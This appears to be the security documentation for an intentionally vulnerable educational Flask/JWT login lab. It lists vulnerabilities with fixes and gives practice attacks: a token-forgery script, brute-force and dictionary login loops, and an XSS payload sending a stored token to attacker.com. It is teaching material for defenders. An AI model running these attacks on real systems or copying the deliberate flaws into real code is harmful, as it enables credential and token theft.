# Security Documentation

Comprehensive security analysis and educational notes for the Hybrid Authentication Lab.

## Overview

This project is an **intentionally vulnerable educational system** designed to demonstrate both security flaws and mitigation strategies.

> ⚠️ **DO NOT use this in production** without implementing all security hardening measures.

## Vulnerability Analysis

### Critical Vulnerabilities

#### 1. Hardcoded Secret Key

**Location**: `app.py` line 18
```python
SECRET_KEY = os.getenv('SECRET_KEY', 'super-secret-key-change-in-production')
```

**Issue**: JWT secret is hardcoded and easily guessable.

**Risk**: 
- Attacker can forge valid JWT tokens
- Complete authentication bypass
- User impersonation possible

**Mitigation**:
```python
# ✅ Correct approach
SECRET_KEY = os.getenv('SECRET_KEY')
if not SECRET_KEY:
    raise RuntimeError("SECRET_KEY environment variable must be set")
```

---

#### 2. Plaintext Passwords

**Location**: `app.py` lines 24-32
```python
USERS = {
    "admin": {
        "username": "admin",
        "password": "password123",  # ❌ PLAINTEXT!
    }
}
```

**Issue**: Passwords stored in plaintext with no hashing.

**Risk**:
- Database breach = immediate credential theft
- No protection against internal threats
- Violates GDPR/PCI compliance

**Mitigation** (Phase 2):
```python
import bcrypt

# Hash password during user creation
hashed_pw = bcrypt.hashpw(
    password.encode('utf-8'), 
    bcrypt.gensalt(rounds=12)
)

# Verify during login
bcrypt.checkpw(password.encode('utf-8'), hashed_pw)
```

---

#### 3. localStorage Token Storage

**Location**: `auth.js` line 42
```javascript
localStorage.setItem(TOKEN_KEY, data.token);  // ❌ JavaScript accessible
```

**Issue**: JWT stored in browser's JavaScript-accessible storage.

**Risk**:
- XSS (Cross-Site Scripting) vulnerability exposes token
- Any script can read user tokens
- No protection from JavaScript injection

**Mitigation** (Phase 2):
```javascript
// ✅ HttpOnly Secure Cookie (backend sets this)
// Cannot be accessed by JavaScript
// Automatically sent with requests
// Must be HTTPS only
```

Backend implementation:
```python
@app.route('/login', methods=['POST'])
def login():
    # ... validation code ...
    
    response = make_response(jsonify({
        'success': True,
        'message': 'Login successful'
    }))
    
    # Set HttpOnly cookie
    response.set_cookie(
        'auth_token',
        token,
        httponly=True,      # ✅ JavaScript cannot access
        secure=True,        # ✅ HTTPS only
        samesite='Strict',  # ✅ CSRF protection
        max_age=86400       # ✅ 24 hour expiration
    )
    
    return response, 200
```

---

#### 4. CORS Wide Open

**Location**: `app.py` line 21
```python
CORS(app, origins=["*"], methods=["GET", "POST", "OPTIONS"])  # ❌ ANY domain
```

**Issue**: CORS allows requests from any origin.

**Risk**:
- Malicious sites can make authenticated requests
- Token exposed to cross-origin attacks
- No origin validation

**Mitigation** (Phase 2):
```python
CORS(app, 
     origins=[
         "https://yourusername.github.io",
         "https://yourdomain.com"
     ],
     supports_credentials=True,
     methods=["GET", "POST"],
     allow_headers=["Content-Type", "Authorization"]
)
```

---

### High Severity Vulnerabilities

#### 5. No Rate Limiting

**Issue**: Unlimited login attempts allowed.

**Risk**:
- Brute force attacks possible
- Weak passwords easily compromised
- Denial of service via request flooding

**Solution**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 attempts per minute
def login():
    # ...
```

---

#### 6. No Refresh Token Mechanism

**Issue**: Single long-lived JWT token.

**Risk**:
- Compromised token valid for 24 hours
- No way to invalidate leaked tokens
- Token rotation not possible

**Solution** (Phase 2):
```python
# Issue two tokens:
# - Short-lived access token (15 minutes)
# - Long-lived refresh token (7 days)

# When access token expires:
# - Client uses refresh token to get new access token
# - If refresh token compromised, only 7 days exposure
# - User can logout and revoke all refresh tokens
```

---

#### 7. Cleartext HTTP Possible

**Issue**: No HTTPS enforcement.

**Risk**:
- Man-in-the-middle attacks
- Token interception on network
- Credential capture possible

**Solution**:
```python
# In production, enforce HTTPS
from flask_talisman import Talisman

Talisman(app, force_https=True)
```

---

### Medium Severity Issues

#### 8. No CSRF Protection

**Issue**: No anti-CSRF tokens implemented.

**Risk**:
- Cross-site request forgery attacks
- Attacker can forge requests with stolen token

**Solution**:
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

@app.route('/login', methods=['POST'])
@csrf.exempt  # API endpoints typically exempt
def login():
    # ...
```

---

#### 9. Minimal Logging

**Issue**: Limited audit trail for debugging/security.

**Risk**:
- Cannot detect suspicious activity
- Incident investigation difficult
- Compliance violations

**Solution**:
```python
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('app.log'),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

@app.route('/login', methods=['POST'])
def login():
    logger.info(f"Login attempt from {request.remote_addr}")
    # ...
    logger.warning(f"Failed login for {username}")
    # ...
```

---

#### 10. No Token Revocation

**Issue**: Logged-out tokens still valid until expiration.

**Risk**:
- Cannot force logout (except by client clearing storage)
- Compromised token valid even after discovery
- No way to invalidate sessions

**Solution**:
```python
# Maintain blacklist of revoked tokens
REVOKED_TOKENS = set()

@app.route('/logout', methods=['POST'])
@token_required
def logout():
    token = get_token_from_header()
    REVOKED_TOKENS.add(token)
    
    return jsonify({
        'success': True,
        'message': 'Logged out successfully'
    }), 200

def verify_token(token):
    if token in REVOKED_TOKENS:
        return None  # Token is revoked
    # ... rest of verification ...
```

---

## Security Best Practices Implemented

Despite vulnerabilities, some security measures are in place:

✅ **JWT Implementation**
- Stateless authentication tokens
- HMAC-SHA256 signature verification
- Token expiration (24 hours)

✅ **Bearer Authentication**
- Standard Authorization header format
- Proper parsing and validation
- Clear error messages

✅ **Input Validation**
- Username/password required checks
- Type validation
- Error handling without exposing internals

✅ **HTTP Status Codes**
- Proper 401 Unauthorized for auth failures
- Proper 403 Forbidden for access denied
- Proper 500 Internal Server Error

✅ **CORS Configuration**
- Controlled cross-origin requests
- Configurable origins
- Specific method whitelisting

---

## Security Testing (Ethical Hacking)

### 1. Token Forgery

Try forging a token with the hardcoded secret:

```python
import jwt

# Using the default secret
token = jwt.encode(
    {'username': 'hacker', 'exp': datetime.utcnow() + timedelta(hours=24)},
    'super-secret-key-change-in-production',
    algorithm='HS256'
)

# This token is valid!
print(token)
```

**Learning**: Never hardcode secrets.

---

### 2. Password Cracking

Since passwords are plaintext, try:

```python
# Dictionary attack
common_passwords = ['password123', 'admin', '123456', 'letmein']

for password in common_passwords:
    response = requests.post('http://localhost:5000/login', json={
        'username': 'admin',
        'password': password
    })
    if response.status_code == 200:
        print(f"Found password: {password}")
```

**Learning**: Always hash passwords with bcrypt/argon2.

---

### 3. XSS Token Theft

Inject script in a form field:

```html
<img src=x onerror="fetch('http://attacker.com/steal?token='+localStorage.auth_token)">
```

This would steal the token stored in localStorage.

**Learning**: Never store sensitive data in localStorage.

---

### 4. Brute Force Login

Make rapid login attempts:

```python
import concurrent.futures

passwords = open('wordlist.txt').read().split('\n')

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [
        executor.submit(requests.post, 'http://localhost:5000/login', 
            json={'username': 'admin', 'password': pwd})
        for pwd in passwords
    ]
```

**Learning**: Implement rate limiting (5 attempts/minute).

---

### 5. CORS Exploitation

Make cross-origin request:

```javascript
// From any website, can do:
fetch('https://your-backend.up.railway.app/protected', {
    headers: {'Authorization': 'Bearer stolen_token'},
    credentials: 'include'
}).then(r => r.json()).then(d => console.log(d))
```

**Learning**: Restrict CORS to known origins only.

---

## Phase 2: Security Hardening Roadmap

### Immediate (Critical)
- [ ] Hash passwords with bcrypt
- [ ] Use environment variables for secrets
- [ ] Implement HttpOnly secure cookies
- [ ] Add rate limiting

### Short-term (High Priority)
- [ ] Implement refresh token mechanism
- [ ] Add request logging & monitoring
- [ ] Set CORS to specific origins
- [ ] Add CSRF token protection
- [ ] Implement token revocation

### Medium-term (Medium Priority)
- [ ] Move to real database (PostgreSQL)
- [ ] Add email verification
- [ ] Implement multi-factor authentication
- [ ] Add request signing
- [ ] Security headers (CSP, X-Frame-Options, etc.)

### Long-term (Strategic)
- [ ] OAuth 2.0 / OpenID Connect
- [ ] Zero-trust architecture
- [ ] API Gateway with rate limiting
- [ ] Security audit & penetration testing
- [ ] Incident response procedures

---

## Compliance Considerations

### GDPR (General Data Protection Regulation)
- Currently not compliant (plaintext passwords)
- Need data minimization
- Need secure data deletion

### PCI DSS (Payment Card Industry)
- Not suitable for payment processing
- Would need extensive hardening

### HIPAA (Healthcare)
- Not compliant (no encryption, minimal audit)
- PHI cannot be stored

### SOC 2
- Insufficient logging and monitoring
- No change management
- No disaster recovery

---

## Resources for Further Learning

### JWT Security
- [jwt.io](https://jwt.io) - JWT debugger and documentation
- [IETF RFC 7519](https://tools.ietf.org/html/rfc7519) - JWT specification

### OWASP Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

### Python Security
- [OWASP Python Security](https://owasp.org/www-community/attacks/Python_Code_Injection)
- [Bandit](https://bandit.readthedocs.io/) - Python security issue scanner

### Flask Security
- [Flask-Security](https://flask-security-too.readthedocs.io/)
- [Flask-WTF](https://flask-wtf.readthedocs.io/)

---

## Vulnerability Disclosure

If you find a real vulnerability in educational resources:

1. Do not publicly disclose
2. Email: security@yourproject.com
3. Allow 90 days for patching
4. Credit in security advisory

---

**Remember**: This is an educational project. Understanding vulnerabilities is the first step to building secure systems.
